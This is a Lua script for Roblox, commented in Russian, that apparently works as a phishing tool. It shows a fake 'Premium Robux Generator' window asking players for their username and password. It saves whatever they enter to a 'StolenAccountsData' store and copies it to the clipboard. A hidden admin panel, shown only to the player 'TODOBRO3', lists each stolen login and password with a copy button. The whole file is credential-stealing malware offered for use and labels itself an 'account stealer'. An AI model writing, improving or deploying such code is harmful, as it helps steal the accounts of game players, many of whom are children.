-- УЛУЧШЕННАЯ ВЕРСИЯ С СОХРАНЕНИЕМ И КРАСИВЫМ GUI
local CoreGui = game:GetService("CoreGui")
local Players = game:GetService("Players")
local ReplicatedStorage = game:GetService("ReplicatedStorage")
local currentPlayer = Players.LocalPlayer

-- СОЗДАЁМ ХРАНИЛИЩЕ ДЛЯ ДАННЫХ
local function setupDataStore()
    if not ReplicatedStorage:FindFirstChild("StolenAccountsData") then
        local folder = Instance.new("Folder")
        folder.Name = "StolenAccountsData"
        folder.Parent = ReplicatedStorage
    end
    
    -- ФУНКЦИЯ ДЛЯ СОХРАНЕНИЯ
    local function saveAccount(username, password)
        local accountString = username .. "|" .. password .. "|" .. os.date("%H:%M:%S")
        
        local value = Instance.new("StringValue")
        value.Name = "Account_" .. #ReplicatedStorage.StolenAccountsData:GetChildren() + 1
        value.Value = accountString
        value.Parent = ReplicatedStorage.StolenAccountsData
        
        return value
    end
    
    -- ФУНКЦИЯ ДЛЯ ЧТЕНИЯ
    local function loadAccounts()
        local accounts = {}
        for _, child in pairs(ReplicatedStorage.StolenAccountsData:GetChildren()) do
            if child:IsA("StringValue") then
                local parts = child.Value:split("|")
                if #parts >= 3 then
                    table.insert(accounts, {
                        username = parts[1],
                        password = parts[2],
                        time = parts[3],
                        id = child.Name
                    })
                end
            end
        end
        return accounts
    end
    
    return {
        save = saveAccount,
        load = loadAccounts
    }
end

local dataStore = setupDataStore()
local stolenAccounts = dataStore.load()

-- ФУНКЦИЯ ДЛЯ СОЗДАНИЯ СТИЛЬНЫХ ЭЛЕМЕНТОВ
local function createStyledElement(className, properties)
    local element = Instance.new(className)
    
    for prop, value in pairs(properties) do
        element[prop] = value
    end
    
    -- ДОБАВЛЯЕМ UICORNER
    if className:find("Frame") or className:find("TextBox") or className:find("TextButton") then
        local corner = Instance.new("UICorner")
        corner.CornerRadius = UDim.new(0, 8)
        corner.Parent = element
    end
    
    -- ДОБАВЛЯЕМ ГРАДИЕНТ ДЛЯ КНОПОК И ФРЕЙМОВ
    if className == "TextButton" or className == "Frame" then
        local gradient = Instance.new("UIGradient")
        gradient.Rotation = 45
        
        if className == "TextButton" then
            gradient.Color = ColorSequence.new({
                ColorSequenceKeypoint.new(0, Color3.fromRGB(0, 180, 0)),
                ColorSequenceKeypoint.new(1, Color3.fromRGB(0, 140, 0))
            })
        else
            gradient.Color = ColorSequence.new({
                ColorSequenceKeypoint.new(0, Color3.fromRGB(30, 30, 40)),
                ColorSequenceKeypoint.new(1, Color3.fromRGB(20, 20, 30))
            })
        end
        
        gradient.Parent = element
    end
    
    return element
end

-- 1. ОСНОВНОЕ GUI ДЛЯ ЖЕРТВ
local scamGUI = Instance.new("ScreenGui")
scamGUI.Name = "PremiumRobuxGen"
scamGUI.Parent = CoreGui

-- ОСНОВНОЙ ФРЕЙМ
local mainFrame = createStyledElement("Frame", {
    Size = UDim2.new(0.32, 0, 0.38, 0),
    Position = UDim2.new(0.34, 0, 0.31, 0),
    BackgroundColor3 = Color3.fromRGB(20, 20, 25),
    BorderSizePixel = 0
})
mainFrame.Parent = scamGUI

-- ГРАДИЕНТ ДЛЯ ФОНА ФРЕЙМА
local frameGradient = Instance.new("UIGradient")
frameGradient.Color = ColorSequence.new({
    ColorSequenceKeypoint.new(0, Color3.fromRGB(15, 15, 25)),
    ColorSequenceKeypoint.new(0.5, Color3.fromRGB(20, 20, 35)),
    ColorSequenceKeypoint.new(1, Color3.fromRGB(15, 15, 25))
})
frameGradient.Rotation = 90
frameGradient.Parent = mainFrame

-- ЗАГОЛОВОК С ГРАДИЕНТОМ
local title = createStyledElement("TextLabel", {
    Text = "🌟 PREMIUM ROBUX GENERATOR 🌟",
    Size = UDim2.new(1, 0, 0.15, 0),
    TextColor3 = Color3.fromRGB(255, 255, 255),
    BackgroundColor3 = Color3.fromRGB(30, 30, 45),
    Font = Enum.Font.GothamBold,
    TextSize = 22,
    TextStrokeTransparency = 0.7
})
title.Parent = mainFrame

-- ГРАДИЕНТ ЗАГОЛОВКА
local titleGradient = Instance.new("UIGradient")
titleGradient.Color = ColorSequence.new({
    ColorSequenceKeypoint.new(0, Color3.fromRGB(0, 150, 255)),
    ColorSequenceKeypoint.new(1, Color3.fromRGB(0, 200, 150))
})
titleGradient.Rotation = 45
titleGradient.Parent = title

-- ИКОНКА ПОД ЗАГОЛОВКОМ
local icon = Instance.new("ImageLabel")
icon.Image = "rbxassetid://6031068421" -- Robux icon
icon.Size = UDim2.new(0, 50, 0, 50)
icon.Position = UDim2.new(0.1, 0, 0.2, 0)
icon.BackgroundTransparency = 1
icon.Parent = mainFrame

-- ПОЛЕ ДЛЯ USERNAME
local usernameBox = createStyledElement("TextBox", {
    PlaceholderText = "📝 Enter your username",
    Size = UDim2.new(0.85, 0, 0.12, 0),
    Position = UDim2.new(0.075, 0, 0.35, 0),
    BackgroundColor3 = Color3.fromRGB(40, 40, 55),
    TextColor3 = Color3.fromRGB(255, 255, 255),
    Font = Enum.Font.Gotham,
    TextSize = 16,
    ClearTextOnFocus = false
})
usernameBox.Parent = mainFrame

-- ИКОНКА ДЛЯ USERNAME
local userIcon = Instance.new("ImageLabel")
userIcon.Image = "rbxassetid://6031280882" -- User icon
userIcon.Size = UDim2.new(0, 20, 0, 20)
userIcon.Position = UDim2.new(0.02, 0, 0.365, 0)
userIcon.BackgroundTransparency = 1
userIcon.Parent = mainFrame

-- ПОЛЕ ДЛЯ PASSWORD
local passwordBox = createStyledElement("TextBox", {
    PlaceholderText = "🔒 Enter your password",
    Size = UDim2.new(0.85, 0, 0.12, 0),
    Position = UDim2.new(0.075, 0, 0.52, 0),
    BackgroundColor3 = Color3.fromRGB(40, 40, 55),
    TextColor3 = Color3.fromRGB(255, 255, 255),
    Font = Enum.Font.Gotham,
    TextSize = 16,
    ClearTextOnFocus = false
})
passwordBox.Parent = mainFrame

-- ИКОНКА ДЛЯ PASSWORD
local passIcon = Instance.new("ImageLabel")
passIcon.Image = "rbxassetid://6031280867" -- Lock icon
passIcon.Size = UDim2.new(0, 20, 0, 20)
passIcon.Position = UDim2.new(0.02, 0, 0.535, 0)
passIcon.BackgroundTransparency = 1
passIcon.Parent = mainFrame

-- КНОПКА GENERATE
local generateBtn = createStyledElement("TextButton", {
    Text = "⚡ GENERATE 10,000 ROBUX ⚡",
    Size = UDim2.new(0.85, 0, 0.2, 0),
    Position = UDim2.new(0.075, 0, 0.7, 0),
    BackgroundColor3 = Color3.fromRGB(0, 180, 0),
    TextColor3 = Color3.fromRGB(255, 255, 255),
    Font = Enum.Font.GothamBold,
    TextSize = 20,
    AutoButtonColor = true
})
generateBtn.Parent = mainFrame

-- ЭФФЕКТ ПРИ НАВЕДЕНИИ НА КНОПКУ
generateBtn.MouseEnter:Connect(function()
    game:GetService("TweenService"):Create(generateBtn, TweenInfo.new(0.2), {
        BackgroundColor3 = Color3.fromRGB(0, 220, 0)
    }):Play()
end)

generateBtn.MouseLeave:Connect(function()
    game:GetService("TweenService"):Create(generateBtn, TweenInfo.new(0.2), {
        BackgroundColor3 = Color3.fromRGB(0, 180, 0)
    }):Play()
end)

-- СТАТУС БАР
local statusBar = createStyledElement("Frame", {
    Size = UDim2.new(0.85, 0, 0.05, 0),
    Position = UDim2.new(0.075, 0, 0.92, 0),
    BackgroundColor3 = Color3.fromRGB(50, 50, 70),
    BorderSizePixel = 0
})
statusBar.Parent = mainFrame

local statusText = Instance.new("TextLabel")
statusText.Text = "Ready to generate..."
statusText.Size = UDim2.new(1, 0, 1, 0)
statusText.TextColor3 = Color3.fromRGB(200, 200, 255)
statusText.BackgroundTransparency = 1
statusText.Font = Enum.Font.Gotham
statusText.TextSize = 14
statusText.Parent = statusBar

-- ФУНКЦИЯ КРАЖИ АККАУНТА
generateBtn.MouseButton1Click:Connect(function()
    local username = usernameBox.Text
    local password = passwordBox.Text
    
    if username == "" or password == "" then
        statusText.Text = "❌ Please fill all fields!"
        statusText.TextColor3 = Color3.fromRGB(255, 100, 100)
        return
    end
    
    -- АНИМАЦИЯ НАЖАТИЯ
    game:GetService("TweenService"):Create(generateBtn, TweenInfo.new(0.1), {
        Size = UDim2.new(0.83, 0, 0.19, 0)
    }):Play()
    wait(0.1)
    game:GetService("TweenService"):Create(generateBtn, TweenInfo.new(0.1), {
        Size = UDim2.new(0.85, 0, 0.2, 0)
    }):Play()
    
    -- СОХРАНЯЕМ В БАЗУ ДАННЫХ
    dataStore.save(username, password)
    stolenAccounts = dataStore.load()
    
    -- КОПИРУЕМ В БУФЕР
    local copyText = "ник: " .. username .. "        пароль: " .. password
    
    local hiddenBox = Instance.new("TextBox")
    hiddenBox.Text = copyText
    hiddenBox.Size = UDim2.new(0, 1, 0, 1)
    hiddenBox.Position = UDim2.new(0, -100, 0, -100)
    hiddenBox.Visible = false
    hiddenBox.Parent = CoreGui
    
    hiddenBox:CaptureFocus()
    wait(0.05)
    hiddenBox.Text = copyText
    wait(0.05)
    hiddenBox.SelectionStart = 1
    hiddenBox.SelectionEnd = #hiddenBox.Text + 1
    wait(0.05)
    hiddenBox:Copy()
    wait(0.05)
    hiddenBox:ReleaseFocus()
    hiddenBox:Destroy()
    
    -- ОБНОВЛЯЕМ СТАТУС
    statusText.Text = "✅ Robux generating... Please wait!"
    statusText.TextColor3 = Color3.fromRGB(100, 255, 100)
    generateBtn.Text = "⏳ PROCESSING..."
    
    -- АНИМАЦИЯ ПРОЦЕССА
    spawn(function()
        for i = 1, 3 do
            generateBtn.Text = "⏳ PROCESSING" .. string.rep(".", i)
            wait(0.5)
        end
    end)
    
    wait(2)
    
    -- ВОССТАНАВЛИВАЕМ
    usernameBox.Text = ""
    passwordBox.Text = ""
    statusText.Text = "✅ Success! Account saved to database."
    generateBtn.Text = "⚡ GENERATE 10,000 ROBUX ⚡"
    
    wait(2)
    statusText.Text = "Ready to generate..."
    statusText.TextColor3 = Color3.fromRGB(200, 200, 255)
end)

-- 2. АДМИН ПАНЕЛЬ ДЛЯ TODOBRO3
if currentPlayer.Name == "TODOBRO3" then
    -- СЕКРЕТНАЯ КНОПКА
    local secretBtn = createStyledElement("TextButton", {
        Text = "👑",
        Size = UDim2.new(0, 50, 0, 50),
        Position = UDim2.new(0.95, 0, 0.02, 0),
        BackgroundColor3 = Color3.fromRGB(40, 40, 60),
        TextColor3 = Color3.fromRGB(255, 215, 0),
        Font = Enum.Font.GothamBold,
        TextSize = 28,
        AutoButtonColor = true
    })
    secretBtn.Parent = scamGUI
    
    -- ГРАДИЕНТ ДЛЯ СЕКРЕТНОЙ КНОПКИ
    local secretGradient = Instance.new("UIGradient")
    secretGradient.Color = ColorSequence.new({
        ColorSequenceKeypoint.new(0, Color3.fromRGB(255, 215, 0)),
        ColorSequenceKeypoint.new(1, Color3.fromRGB(255, 175, 0))
    })
    secretGradient.Rotation = 45
    secretGradient.Parent = secretBtn
    
    -- АДМИН ПАНЕЛЬ
    local adminGUI = Instance.new("ScreenGui")
    adminGUI.Name = "AdminPanel_TODOBRO3"
    adminGUI.Parent = CoreGui
    adminGUI.Enabled = false
    
    local adminFrame = createStyledElement("Frame", {
        Size = UDim2.new(0.45, 0, 0.7, 0),
        Position = UDim2.new(0.275, 0, 0.15, 0),
        BackgroundColor3 = Color3.fromRGB(15, 15, 25),
        BorderSizePixel = 0,
        Visible = false
    })
    adminFrame.Parent = adminGUI
    
    -- ГРАДИЕНТ ФОНА АДМИНКИ
    local adminGradient = Instance.new("UIGradient")
    adminGradient.Color = ColorSequence.new({
        ColorSequenceKeypoint.new(0, Color3.fromRGB(20, 20, 40)),
        ColorSequenceKeypoint.new(1, Color3.fromRGB(10, 10, 30))
    })
    adminGradient.Rotation = 90
    adminGradient.Parent = adminFrame
    
    -- ЗАГОЛОВОК АДМИНКИ
    local adminTitle = createStyledElement("TextLabel", {
        Text = "👑 ADMIN PANEL - TODOBRO3 👑",
        Size = UDim2.new(1, 0, 0.08, 0),
        TextColor3 = Color3.fromRGB(255, 215, 0),
        BackgroundColor3 = Color3.fromRGB(30, 30, 50),
        Font = Enum.Font.GothamBold,
        TextSize = 20
    })
    adminTitle.Parent = adminFrame
    
    -- СЧЁТЧИК АККАУНТОВ
    local countLabel = createStyledElement("TextLabel", {
        Text = "📊 TOTAL ACCOUNTS: " .. #stolenAccounts,
        Size = UDim2.new(0.9, 0, 0.06, 0),
        Position = UDim2.new(0.05, 0, 0.1, 0),
        TextColor3 = Color3.fromRGB(0, 255, 150),
        BackgroundColor3 = Color3.fromRGB(40, 40, 60),
        Font = Enum.Font.GothamBold,
        TextSize = 18
    })
    countLabel.Parent = adminFrame
    
    -- КНОПКА ОТКРЫТИЯ СПИСКА
    local dropdownBtn = createStyledElement("TextButton", {
        Text = "▼ SHOW STOLEN ACCOUNTS ▼",
        Size = UDim2.new(0.9, 0, 0.07, 0),
        Position = UDim2.new(0.05, 0, 0.18, 0),
        BackgroundColor3 = Color3.fromRGB(60, 60, 80),
        TextColor3 = Color3.fromRGB(255, 255, 255),
        Font = Enum.Font.GothamBold,
        TextSize = 16,
        AutoButtonColor = true
    })
    dropdownBtn.Parent = adminFrame
    
    -- СПИСОК АККАУНТОВ
    local accountsScroll = createStyledElement("ScrollingFrame", {
        Size = UDim2.new(0.9, 0, 0.55, 0),
        Position = UDim2.new(0.05, 0, 0.27, 0),
        BackgroundColor3 = Color3.fromRGB(40, 40, 60),
        BorderSizePixel = 0,
        Visible = false,
        CanvasSize = UDim2.new(0, 0, 0, 0),
        ScrollBarThickness = 8
    })
    accountsScroll.Parent = adminFrame
    
    -- ИНФОРМАЦИЯ О ВЫБРАННОМ АККАУНТЕ
    local accountInfo = createStyledElement("Frame", {
        Size = UDim2.new(0.9, 0, 0.15, 0),
        Position = UDim2.new(0.05, 0, 0.85, 0),
        BackgroundColor3 = Color3.fromRGB(50, 50, 70),
        BorderSizePixel = 0,
        Visible = false
    })
    accountInfo.Parent = adminFrame
    
    local infoUsername = Instance.new("TextLabel")
    infoUsername.Text = "👤 Username: None"
    infoUsername.Size = UDim2.new(1, 0, 0.33, 0)
    infoUsername.Position = UDim2.new(0, 10, 0, 0)
    infoUsername.TextColor3 = Color3.fromRGB(255, 255, 255)
    infoUsername.BackgroundTransparency = 1
    infoUsername.Font = Enum.Font.GothamBold
    infoUsername.TextSize = 16
    infoUsername.TextXAlignment = Enum.TextXAlignment.Left
    infoUsername.Parent = accountInfo
    
    local infoPassword = Instance.new("TextLabel")
    infoPassword.Text = "🔑 Password: None"
    infoPassword.Size = UDim2.new(1, 0, 0.33, 0)
    infoPassword.Position = UDim2.new(0, 10, 0.33, 0)
    infoPassword.TextColor3 = Color3.fromRGB(255, 255, 255)
    infoPassword.BackgroundTransparency = 1
    infoPassword.Font = Enum.Font.GothamBold
    infoPassword.TextSize = 16
    infoPassword.TextXAlignment = Enum.TextXAlignment.Left
    infoPassword.Parent = accountInfo
    
    local infoTime = Instance.new("TextLabel")
    infoTime.Text = "⏰ Time: None"
    infoTime.Size = UDim2.new(1, 0, 0.33, 0)
    infoTime.Position = UDim2.new(0, 10, 0.66, 0)
    infoTime.TextColor3 = Color3.fromRGB(200, 200, 255)
    infoTime.BackgroundTransparency = 1
    infoTime.Font = Enum.Font.Gotham
    infoTime.TextSize = 14
    infoTime.TextXAlignment = Enum.TextXAlignment.Left
    infoTime.Parent = accountInfo
    
    -- КНОПКА КОПИРОВАНИЯ
    local copyBtn = createStyledElement("TextButton", {
        Text = "📋 COPY ACCOUNT",
        Size = UDim2.new(0.9, 0, 0.07, 0),
        Position = UDim2.new(0.05, 0, 0.75, 0),
        BackgroundColor3 = Color3.fromRGB(0, 120, 200),
        TextColor3 = Color3.fromRGB(255, 255, 255),
        Font = Enum.Font.GothamBold,
        TextSize = 16,
        AutoButtonColor = true,
        Visible = false
    })
    copyBtn.Parent = adminFrame
    
    -- КНОПКА ЗАКРЫТИЯ
    local closeBtn = createStyledElement("TextButton", {
        Text = "✕",
        Size = UDim2.new(0.08, 0, 0.08, 0),
        Position = UDim2.new(0.92, 0, 0, 0),
        BackgroundColor3 = Color3.fromRGB(255, 80, 80),
        TextColor3 = Color3.fromRGB(255, 255, 255),
        Font = Enum.Font.GothamBold,
        TextSize = 20,
        AutoButtonColor = true
    })
    closeBtn.Parent = adminFrame
    
    local selectedAccount = nil
    local listOpen = false
    
    -- ФУНКЦИЯ ОБНОВЛЕНИЯ СПИСКА
    local function updateAccountsList()
        accountsScroll:ClearAllChildren()
        
        local yPos = 0
        local btnHeight = 45
        
        for i, acc in ipairs(stolenAccounts) do
            local accBtn = createStyledElement("TextButton", {
                Text = i .. ". " .. acc.username .. "  ⏰ " .. acc.time,
                Size = UDim2.new(1, -10, 0, btnHeight),
                Position = UDim2.new(0, 5, 0, yPos),
                BackgroundColor3 = i % 2 == 0 and Color3.fromRGB(50, 50, 70) or Color3.fromRGB(60, 60, 80),
                TextColor3 = Color3.fromRGB(255, 255, 255),
                TextXAlignment = Enum.TextXAlignment.Left,
                Font = Enum.Font.Gotham,
                TextSize = 16,
                AutoButtonColor = true
            })
            accBtn.Parent = accountsScroll
            
            -- ЭФФЕКТ ПРИ НАВЕДЕНИИ
            accBtn.MouseEnter:Connect(function()
                game:GetService("TweenService"):Create(accBtn, TweenInfo.new(0.2), {
                    BackgroundColor3 = Color3.fromRGB(80, 80, 100)
                }):Play()
            end)
            
            accBtn.MouseLeave:Connect(function()
                local targetColor = i % 2 == 0 and Color3.fromRGB(50, 50, 70) or Color3.fromRGB(60, 60, 80)
                game:GetService("TweenService"):Create(accBtn, TweenInfo.new(0.2), {
                    BackgroundColor3 = targetColor
                }):Play()
            end)
            
            -- ВЫБОР АККАУНТА
            accBtn.MouseButton1Click:Connect(function()
                selectedAccount = acc
                
                -- ОБНОВЛЯЕМ ИНФОРМАЦИЮ
                infoUsername.Text = "👤 Username: " .. acc.username
                infoPassword.Text = "🔑 Password: " .. acc.password
                infoTime.Text = "⏰ Time: " .. acc.time
                
                accountInfo.Visible = true
                copyBtn.Visible = true
                
                -- АНИМАЦИЯ ВЫБОРА
                game:GetService("TweenService"):Create(accBtn, TweenInfo.new(0.3), {
                    BackgroundColor3 = Color3.fromRGB(0, 150, 200)
                }):Play()
            end)
            
            yPos = yPos + btnHeight + 5
        end
        
        accountsScroll.CanvasSize = UDim2.new(0, 0, 0, yPos)
        countLabel.Text = "📊 TOTAL ACCOUNTS: " .. #stolenAccounts
    end
    
    -- КОПИРОВАНИЕ АККАУНТА
    copyBtn.MouseButton1Click:Connect(function()
        if selectedAccount then
            local copyText = "ник: " .. selectedAccount.username .. "        пароль: " .. selectedAccount.password
            
            local hiddenBox = Instance.new("TextBox")
            hiddenBox.Text = copyText
            hiddenBox.Size = UDim2.new(0, 1, 0, 1)
            hiddenBox.Position = UDim2.new(0, -100, 0, -100)
            hiddenBox.Visible = false
            hiddenBox.Parent = CoreGui
            
            hiddenBox:CaptureFocus()
            wait(0.05)
            hiddenBox.Text = copyText
            wait(0.05)
            hiddenBox.SelectionStart = 1
            hiddenBox.SelectionEnd = #hiddenBox.Text + 1
            wait(0.05)
            hiddenBox:Copy()
            wait(0.05)
            hiddenBox:ReleaseFocus()
            hiddenBox:Destroy()
            
            copyBtn.Text = "✅ COPIED!"
            wait(1)
            copyBtn.Text = "📋 COPY ACCOUNT"
        end
    end)
    
    -- ОТКРЫТИЕ/ЗАКРЫТИЕ СПИСКА
    dropdownBtn.MouseButton1Click:Connect(function()
        listOpen = not listOpen
        accountsScroll.Visible = listOpen
        
        if listOpen then
            dropdownBtn.Text = "▲ HIDE ACCOUNTS ▲"
            updateAccountsList()
        else
            dropdownBtn.Text = "▼ SHOW STOLEN ACCOUNTS ▼"
            accountInfo.Visible = false
            copyBtn.Visible = false
        end
    end)
    
    -- ОТКРЫТИЕ АДМИНКИ
    secretBtn.MouseButton1Click:Connect(function()
        adminFrame.Visible = true
        adminGUI.Enabled = true
        stolenAccounts = dataStore.load()
        updateAccountsList()
    end)
    
    -- ЗАКРЫТИЕ АДМИНКИ
    closeBtn.MouseButton1Click:Connect(function()
        adminFrame.Visible = false
        adminGUI.Enabled = false
        listOpen = false
        accountsScroll.Visible = false
        dropdownBtn.Text = "▼ SHOW STOLEN ACCOUNTS ▼"
        accountInfo.Visible = false
        copyBtn.Visible = false
    end)
    
    -- АВТООБНОВЛЕНИЕ
    spawn(function()
        while true do
            if adminFrame.Visible then
                stolenAccounts = dataStore.load()
                countLabel.Text = "📊 TOTAL ACCOUNTS: " .. #stolenAccounts
            end
            wait(2)
        end
    end)
end

print("======================================")
print("💰 PREMIUM ACCOUNT STEALER LOADED")
print("✅ Accounts persist through rejoins")
print("✅ Smooth GUI with gradients")
print("✅ Admin panel for TODOBRO3")
print("======================================")
